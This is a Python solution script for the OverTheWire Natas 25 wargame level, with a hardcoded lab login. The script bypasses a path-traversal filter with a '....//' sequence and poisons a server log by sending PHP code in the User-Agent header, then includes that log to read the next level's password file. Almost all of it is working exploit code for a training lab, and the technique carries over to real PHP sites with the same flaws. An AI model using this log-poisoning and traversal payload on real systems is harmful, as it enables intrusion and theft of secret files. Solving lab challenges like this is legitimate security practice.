# Overthewire: Natas 25
# woanmeo11

import requests


url = 'http://natas25.natas.labs.overthewire.org/'
auth = ('natas25', 'GHF6X7YwACaYYssHVY05cFq83hRktl4c')

r = requests.get(url, auth=auth)
phpsessid = r.cookies['PHPSESSID']

cookies = {'PHPSESSID': phpsessid}
params = {'lang': '....//logs/natas25_' + phpsessid + '.log'}
headers = {'user-agent': '<? readfile("/etc/natas_webpass/natas26") ?>'}

r = requests.get(url, auth=auth, cookies=cookies, headers=headers, params=params)
print(r.text)
